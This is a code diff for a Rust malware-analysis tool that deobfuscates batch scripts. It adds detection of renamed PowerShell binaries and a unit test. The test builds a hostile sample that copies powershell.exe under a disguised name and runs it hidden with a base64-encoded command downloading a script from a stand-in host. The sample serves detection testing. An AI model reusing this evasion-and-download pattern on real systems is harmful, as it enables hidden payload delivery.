@@ -2857,6 +2857,7 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         let raw_text = String::from_utf8_lossy(input);
         deob_scan::scan_embedded_powershell_invocations(&raw_text, &mut env);
         deob_scan::scan_embedded_powershell_invocations(&out, &mut env);
+        deob_scan::scan_renamed_powershell_invocations(&out, &mut env);
         env.all_extracted_ps1
             .extend(std::mem::take(&mut env.exec_ps1));
         profile_mark!("embedded_ps");
@@ -3004,7 +3005,7 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
     // in `out` — avoids re-emitting plain inline `powershell -c "…"`
     // commands the lex/normalize already rendered.
     let mut emitted_ps_keys: std::collections::HashSet<String> = std::collections::HashSet::new();
-    let mut appended_extracted_payload = false;
+    let mut appended_payload_scan_start = None;
     for ps in &extracted_ps1_normalized {
         let trimmed = ps.trim();
         if trimmed.is_empty() {
@@ -3069,15 +3070,16 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         } else {
             "child"
         };
+        let scan_start = *appended_payload_scan_start.get_or_insert(out.len());
         out.push_str(&format!(
             "\r\n::==== harrington: extracted {kind} payload ====\r\n"
         ));
-        appended_extracted_payload = true;
         out.push_str(ps.trim_end());
         if !ps.ends_with('\n') {
             out.push_str("\r\n");
         }
         out.push_str(&format!("::==== end extracted {kind} payload ====\r\n"));
+        debug_assert!(scan_start <= out.len());
     }
     // Run targeted scans on the FINAL `out` so detectors that live in
     // scan_deob_text but are gated on banner-only text (PS payloads
@@ -3092,7 +3094,12 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
     // the scan is an exact duplicate of the earlier deob scan and can dominate
     // runtime on BatCloak-style reconstruction output.
     const MAX_UNCHANGED_FINAL_SCAN_BYTES: usize = 1024 * 1024;
-    if appended_extracted_payload || out.len() <= MAX_UNCHANGED_FINAL_SCAN_BYTES {
+    if let Some(scan_start) = appended_payload_scan_start {
+        deob_scan::scan_deob_text(&out[scan_start..], &mut env);
+        // Re-run dedup since the post-banner scan may have emitted dupes.
+        let max_per_kind = cfg.max_traits_per_kind;
+        dedup_traits(&mut env.traits, max_per_kind);
+    } else if out.len() <= MAX_UNCHANGED_FINAL_SCAN_BYTES {
         deob_scan::scan_deob_text(&out, &mut env);
         // Re-run dedup since the post-banner scan may have emitted dupes.
         let max_per_kind = cfg.max_traits_per_kind;
@@ -5340,8 +5347,10 @@ mod start_tests {
 
 #[cfg(test)]
 mod powershell_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
+    use crate::traits::Trait;
     use base64::Engine;
 
     #[test]
@@ -5444,6 +5453,30 @@ mod powershell_tests {
         let stored = String::from_utf8_lossy(&env.exec_ps1[0]).into_owned();
         let trimmed: String = stored.chars().filter(|c| *c != '\0').collect();
         assert_eq!(trimmed, payload);
+    }
+
+    #[test]
+    fn copied_powershell_alias_encoded_command_extracts() {
+        let payload = "iwr http://renamed-powershell.example/p.ps1";
+        let utf16: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
+        let script = format!(
+            "copy /y C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe script.bat.exe\r\nscript.bat.exe -wIn 1 -enC {b64}\r\n"
+        );
+        let r = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            r.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                    if src == "http://renamed-powershell.example/p.ps1"
+            )),
+            "renamed PowerShell encoded payload URL not extracted: {:?}\n{}",
+            r.traits,
+            r.deobfuscated
+        );
     }
 }
 
